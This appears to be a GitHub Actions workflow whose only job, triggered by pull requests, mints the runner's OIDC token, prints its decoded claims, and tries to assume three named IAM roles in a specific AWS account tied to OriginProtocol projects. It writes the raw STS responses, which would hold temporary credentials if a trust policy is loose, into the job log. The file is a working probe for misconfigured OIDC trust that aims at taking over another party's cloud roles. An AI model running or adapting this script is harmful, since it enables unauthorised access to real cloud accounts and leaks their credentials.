name: w13b10pr
on:
  pull_request:
    branches: [master]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: mint and test
        run: |
          set +e
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "TOKEN_LEN=${#TOKEN}"
          python3 -c "import base64,sys; p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4); print('CLAIM', base64.urlsafe_b64decode(p).decode())" "$TOKEN"
          for ROLE in talos-gha-OriginProtocol-origin-dollar talos-gha-OriginProtocol-arm-oeth talos-gha-OriginProtocol-clear-signing-erc7730-registry; do
            RESP=$(curl -s -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w13b10" --data-urlencode "WebIdentityToken=$TOKEN")
            echo "--- $ROLE"
            echo "$RESP" | head -c 800; echo
          done
